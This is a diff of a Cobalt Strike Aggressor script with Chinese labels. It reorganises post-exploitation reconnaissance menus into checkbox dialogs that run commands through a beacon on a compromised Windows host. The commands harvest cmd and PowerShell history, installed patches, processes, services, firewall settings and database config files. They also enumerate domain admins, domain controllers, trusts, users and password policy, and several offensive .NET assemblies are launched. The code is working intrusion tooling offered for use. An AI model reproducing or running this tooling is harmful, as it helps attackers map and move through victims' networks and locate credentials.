@@ -9,96 +9,377 @@
 ##############################
 menu "信息收集" {
 
-				item "获取登录的QQ" {
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "dir \\\\.\\pipe\\\\ | findstr \"QQ_\" | findstr \"_pipe\"");
-			}
-		}	
+        item "常用信息"{
+            $bid = $1['@'];
+            $dialog = dialog("常用信息",%(bid => $bid), &main);
+            dialog_description($dialog, "常用信息收集");
+            drow_checkbox($dialog, "QQ", "获取登录的QQ", "");
+            drow_checkbox($dialog, "SharpChassisType", "获取当前主机类型", "");
+            drow_checkbox($dialog, "cmd", "查看cmd历史命令", "");
+            drow_checkbox($dialog, "powershell", "查看powershell历史命令", "");
+            drow_checkbox($dialog, "recenttest", "查看文件浏览历史", "");
+            drow_checkbox($dialog, "recent_ladon", "查看文件浏览历史-ladon", "");
+            drow_checkbox($dialog, "smb", "查看SMB指向路径", "");
+            drow_checkbox($dialog, "brief", "查看安装程序和版本信息", "");
+            drow_checkbox($dialog, "hotfixid", "查看安装的补丁", "");
+            drow_checkbox($dialog, "process", "查看运行进程", "");
+            drow_checkbox($dialog, "processid", "查看进程详细", "");
+            drow_checkbox($dialog, "start", "查看服务", "");
+            drow_checkbox($dialog, "firewall", "查看防火墙配置", "");
+            drow_checkbox($dialog, "schtasks_exe", "查看计划任务", "");
+            drow_checkbox($dialog, "schtasks", "查看计划任务详情", "");
+            drow_checkbox($dialog, "database", "查找数据库配置文件", "");
+            drow_checkbox($dialog, "workstation", "查看开机时间", "");
+            drow_checkbox($dialog, "startup", "查看启动项", "");
+            drow_checkbox($dialog, "qwinsta", "查看在线用户", "");
+            dbutton_action($dialog, "运行");
+            dialog_show($dialog);
+        }
+		
 
-			item "获取当前主机类型" {
-			bexecute_assembly($1, script_resource("/script/SharpChassisType.exe"), "");
-		}
-				item "查看cmd历史命令" {
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "doskey /history");
-			}
-		}
-				item "查看powershell历史命令" {
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt");
-			}
-		}
-				item "查看文件浏览历史" {
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "dir %APPDATA%\\Microsoft\\Windows\\Recent");
-			}
-		}		
-				item "查看SMB指向路径" {
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "wmic share get name,path");
-			}
-		}
-				item "查看安装程序和版本信息" {
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "wmic product list brief");
-			}
-		}
-				item "查看安装的补丁" {
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "wmic qfe  get hotfixid");
-			}
-		}
-				item "查看进程详细" {
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "wmic process get caption,commandline,processid /value");
-			}
-		}
-				item "查看服务" {
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "net start");
-			}
-		}
-				item "查看防火墙配置" {
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "netsh firewall show config");
-			}
-		}
-				item "查看域管" {
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "net group \"domain admins\" /domain");
-			}
-		}
-			    item "查找数据库配置文件" {
-             prompt_text("网站目录", "", lambda({
-            bshell(@ids, "dir / a / s / b \"$1\ * config *\"");
-        }, @ids => $1));
+        item "内网信息"{
+            $bid = $1['@'];
+            $dialog = dialog("内网信息",%(bid => $bid), &neiwang);
+            dialog_description($dialog, "内网信息收集");
+            drow_checkbox($dialog, "view_domain", "查询域", "");
+            drow_checkbox($dialog, "domainadmin", "查看域管", "");
+            drow_checkbox($dialog, "route_print", "查看路由表", "");
+            drow_checkbox($dialog, "domain_sid", "查看域SID", "");
+            drow_checkbox($dialog, "domain_user", "查看指定域用户详细信息", "");
+            drow_checkbox($dialog, "domain_workstation", "查看当前登录域", "");
+            drow_checkbox($dialog, "domain_time", "判断主域", "");
+            drow_checkbox($dialog, "domain_computer", "查看域内所有计算机", "");
+            drow_checkbox($dialog, "domain_group", "查看域内所有用户组列表", "");
+            drow_checkbox($dialog, "domain_computers", "查看所有域成员计算机列表", "");
+            drow_checkbox($dialog, "domain_accounts", "获取域密码信息", "");
+            drow_checkbox($dialog, "domain_trusts", "获取域信任信息", "");
+            drow_checkbox($dialog, "domain_dcname", "查看域控机器名", "");
+            drow_checkbox($dialog, "domain_dcldap", "查看域控主机名", "");
+            drow_checkbox($dialog, "domain_dcgroup", "查看域控列表", "");
+            drow_checkbox($dialog, "domain_dcdc", "查看主域控制器", "");
+            drow_checkbox($dialog, "domain_dcuser", "查看所有域用户", "");
+            drow_checkbox($dialog, "domain_dcuserwmi", "查看所有域用户详细信息", "");
+            drow_checkbox($dialog, "domain_dcadministrators", "查看登录本机的域管", "");
+            drow_checkbox($dialog, "domain_online", "查看同一域内在线机器列表", "");
+            dbutton_action($dialog, "运行");
+            dialog_show($dialog);
+        }
+
+sub main{
+    foreach $func (keys($3)){
+        if ($3[$func] eq 'true'){
+            eval($func.'();');
+        }
     }
-				item "systeminfo" {
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "systeminfo");
-			}
-		}
+
+}
+
+sub neiwang{
+    foreach $func (keys($3)){
+        if ($3[$func] eq 'true'){
+            eval($func.'();');
+        }
+    }
+
+}
+
+sub QQ{
+    btask($bid, "####################", "");
+    btask($bid, "##  获取登录的QQ   ##", "");
+	btask($bid, "####################", "");
+    bshell($bid, "dir \\\\.\\pipe\\\\ | findstr \"QQ_\" | findstr \"_pipe\"");
+}
+
+sub SharpChassisType{
+    btask($bid, "########################", "");
+    btask($bid, "##  获取当前主机类型   ##", "");
+	btask($bid, "########################", "");
+    bexecute_assembly($bid, script_resource("/script/SharpChassisType.exe"), "");
+}
+
+sub cmd{
+    btask($bid, "########################", "");
+    btask($bid, "##  查看cmd历史命令    ##", "");
+	btask($bid, "########################", "");
+    bshell($bid, "doskey /history");
+}
+
+sub powershell{
+    btask($bid, "#############################", "");
+    btask($bid, "##  查看powershell历史命令  ##", "");
+	btask($bid, "#############################", "");
+    bshell($bid, "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt");
+}
+
+sub recenttest{
+    btask($bid, "#######################", "");
+    btask($bid, "##  查看文件浏览历史  ##", "");
+	btask($bid, "#######################", "");
+    bshell($bid, "dir %APPDATA%\\Microsoft\\Windows\\Recent");
+}
+
+sub recent_ladon{
+    btask($bid, "#######################", "");
+    btask($bid, "##  查看文件浏览历史  ##", "");
+	btask($bid, "#######################", "");
+    bexecute_assembly($bid, script_resource("/script/Ladon.exe"), "Recent");
+}
+
+sub smb{
+    btask($bid, "########################", "");
+    btask($bid, "##  查看SMB指向路径    ##", "");
+	btask($bid, "########################", "");
+    bshell($bid, "wmic share get name,path");
+}
+
+sub brief{
+    btask($bid, "#############################", "");
+    btask($bid, "##  查看安装程序和版本信息  ##", "");
+	btask($bid, "#############################", "");
+    bshell($bid, "wmic product get name,version");
+}
+
+sub hotfixid{
+    btask($bid, "#####################", "");
+    btask($bid, "##  查看安装的补丁  ##", "");
+	btask($bid, "#####################", "");
+    bshell($bid, "wmic qfe get Caption,Description,HotFixID,InstalledOn");
+}
+
+sub process{
+    btask($bid, "#####################", "");
+    btask($bid, "##  查看运行的进程  ##", "");
+	btask($bid, "#####################", "");
+    bshell($bid, "wmic process get caption,executablepath,commandline");
+}
+
+sub processid{
+    btask($bid, "###################", "");
+    btask($bid, "##  查看进程详细  ##", "");
+	btask($bid, "###################", "");
+    bshell($bid, "wmic process get caption,commandline,processid /value");
+}
+
+sub start{
+    btask($bid, "###############", "");
+    btask($bid, "##  查看服务  ##", "");
+	btask($bid, "###############", "");
+    bshell($bid, "wmic service list brief");
+}
+
+sub firewall{
+    btask($bid, "#####################", "");
+    btask($bid, "##  查看防火墙配置  ##", "");
+	btask($bid, "#####################", "");
+    bshell($bid, "netsh firewall show config");
+}
+
+sub schtasks_exe{
+    btask($bid, "###################", "");
+    btask($bid, "##  查看计划任务  ##", "");
+	btask($bid, "###################", "");
+    bshell($bid, "schtasks.exe");
+}
+
+sub schtasks{
+    btask($bid, "#######################", "");
+    btask($bid, "##  查看计划任务详情  ##", "");
+	btask($bid, "#######################", "");
+    bshell($bid, "schtasks /query /fo LIST /v");
+}
+
+sub database{
+    btask($bid, "#########################", "");
+    btask($bid, "##  查找数据库配置文件  ##", "");
+	btask($bid, "#########################", "");
+    prompt_text("网站目录", "", lambda({
+    bshell(@bid, "dir / a / s / b \"$1\ * config *\"");
+        }, @bid => $bid));
+}
+
+sub workstation{
+    btask($bid, "###################", "");
+    btask($bid, "##  查看开机时间  ##", "");
+	btask($bid, "###################", "");
+    bshell($bid, "net statistics workstation");
+}
+
+sub startup{
+    btask($bid, "#######################", "");
+    btask($bid, "##  查看启动程序信息  ##", "");
+	btask($bid, "#######################", "");
+    bshell($bid, "wmic startup get command,caption");
+}
+
+sub qwinsta{
+    btask($bid, "###################", "");
+    btask($bid, "##  查看在线用户  ##", "");
+	btask($bid, "###################", "");
+    bshell($bid, "query user || qwinsta");
+}
+
+
+
+######################################################################################################################
+
+sub view_domain{
+    btask($bid, "##############", "");
+    btask($bid, "##  查询域  ##", "");
+	btask($bid, "##############", "");
+    bshell($bid, "net view /domain");
+}
+
+sub domainadmin{
+    btask($bid, "###############", "");
+    btask($bid, "##  查看域管  ##", "");
+	btask($bid, "###############", "");
+    bshell($bid, "net group \"domain admins\" /domain");
+}
+
+sub route_print{
+    btask($bid, "#################", "");
+    btask($bid, "##  查看路由表  ##", "");
+	btask($bid, "#################", "");
+    bshell($bid, "route print");
+}
+
+sub domain_sid{
+    btask($bid, "#################", "");
+    btask($bid, "##  查看路由表  ##", "");
+	btask($bid, "#################", "");
+    bshell($bid, "whoami /all");
+}
+
+sub domain_user{
+    btask($bid, "#########################", "");
+    btask($bid, "##  查看域用户详细信息  ##", "");
+	btask($bid, "#########################", "");
+    prompt_text("输入域用户名", "", lambda({
+    bshell(@bid, "net user $1 /domain");
+        }, @bid => $bid));
+}
+
+sub domain_workstation{
+    btask($bid, "#####################", "");
+    btask($bid, "##  查看当前登录域  ##", "");
+	btask($bid, "#####################", "");
+    bshell($bid, "net config workstation");
+}
+
+sub domain_time{
+    btask($bid, "####################################################", "");
+    btask($bid, "##  判断主域,域服务器通常会同时作为时间服务器使用  ##", "");
+	btask($bid, "####################################################", "");
+    bshell($bid, "net time /domain");
+}
+
+sub domain_computer{
+    btask($bid, "#########################", "");
+    btask($bid, "##  查看域内所有计算机  ##", "");
+	btask($bid, "#########################", "");
+    prompt_text("输入主机名", "", lambda({
+    bshell(@bid, "net view /domain:$1");
+        }, @bid => $bid));
+}
+
+sub domain_group{
+    btask($bid, "##############################", "");
+    btask($bid, "##  查看域内所有用户组列表  ##", "");
+	btask($bid, "##############################", "");
+    bshell($bid, "net group /domain");
+}
+
+sub domain_computers{
+    btask($bid, "##############################", "");
+    btask($bid, "##  查看所有域成员计算机列表  ##", "");
+	btask($bid, "##############################", "");
+    bshell($bid, "net group \"domain computers\" /domain");
+}
+
+sub domain_accounts{
+    btask($bid, "######################", "");
+    btask($bid, "##  获取域密码信息  ##", "");
+	btask($bid, "######################", "");
+    bshell($bid, "net accounts /domain");
+}
+
+sub domain_trusts{
+    btask($bid, "######################", "");
+    btask($bid, "##  获取域信任信息  ##", "");
+	btask($bid, "######################", "");
+    bshell($bid, "nltest /domain_trusts");
+}
+
+sub domain_dcname{
+    btask($bid, "######################", "");
+    btask($bid, "##  查看域控机器名  ##", "");
+	btask($bid, "######################", "");
+    prompt_text("输入主机名", "", lambda({
+    bshell(@bid, "nltest /DCLIST:$1");
+        }, @bid => $bid));
+}
+
+sub domain_dcldap{
+    btask($bid, "######################", "");
+    btask($bid, "##  查看域控主机名  ##", "");
+	btask($bid, "######################", "");
+    bshell($bid, "Nslookup -type=SRV _ldap._tcp");
+}
+
+sub domain_dcgroup{
+    btask($bid, "####################", "");
+    btask($bid, "##  查看域控列表  ##", "");
+	btask($bid, "####################", "");
+    bshell($bid, "net group \"Domain Controllers\" /domain");
+}
+
+sub domain_dcdc{
+    btask($bid, "######################", "");
+    btask($bid, "##  查看主域控制器  ##", "");
+	btask($bid, "######################", "");
+    bshell($bid, "netdom query pdc");
+}
+
+sub domain_dcuser{
+    btask($bid, "######################", "");
+    btask($bid, "##  查看所有域用户  ##", "");
+	btask($bid, "######################", "");
+    bshell($bid, "net user /domain");
+}
+
+sub domain_dcuserwmi{
+    btask($bid, "##############################", "");
+    btask($bid, "##  查看所有域用户详细信息  ##", "");
+	btask($bid, "##############################", "");
+    bshell($bid, "wmic useraccount get /all");
+}
+
+sub domain_dcadministrators{
+    btask($bid, "##########################", "");
+    btask($bid, "##  查看登录本机的域管  ##", "");
+	btask($bid, "##########################", "");
+    bshell($bid, "net localgroup administrators /domain");
+}
+
+sub domain_online{
+    btask($bid, "################################", "");
+    btask($bid, "##  查看同一域内在线机器列表  ##", "");
+	btask($bid, "################################", "");
+    bshell($bid, "net view");
+}
+
+
+
+
     menu "查看mstsc记录"{
 	            item "查看所有用户的记录"{
                 $bid = $1['@'];
-                $Dialog = dialog("listlog",%(bid => $bid),&listlog);
+                $Dialog = dialog("listlog",%(bid => $bid),&listlogs);
                 dialog_description($Dialog, "Mstsc");
                 dbutton_action($Dialog, "运行");
                 dialog_show($Dialog);
             }
-sub listlog {
+sub listlogs {
 	local('$script');
 
 	$oneliner = beacon_host_script($bid);
@@ -130,17 +411,7 @@ sub listlog {
 	bpause($bid, 10000);
 
 }
-				item "枚举当前域" {
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "net view /domain");
-			}
-		}
-			    item "枚举域上主机列表" {
-             prompt_text("domain?", "", lambda({
-            bshell(@ids, "net view /DOMAIN:$1");
-        }, @ids => $1));
-    }
+
 	        item "SharpEventLog" {
 			$bid = $1;
 			$dialog = dialog("SharpEventLog", %(EventLogType => "-4624",bid => $bid), &SharpEventLog);
@@ -195,6 +466,7 @@ sub SharpSQLDump {
 		item "SharpClipHistory" {
 			bexecute_assembly($1, script_resource("/script/SharpClipHistory.exe"), "");
 		}
+
 	        item "SharpAVKB" {
 			$bid = $1;
 			$dialog = dialog("SharpAVKB", %(type => "-AV",bid => $bid), &SharpAVKB);
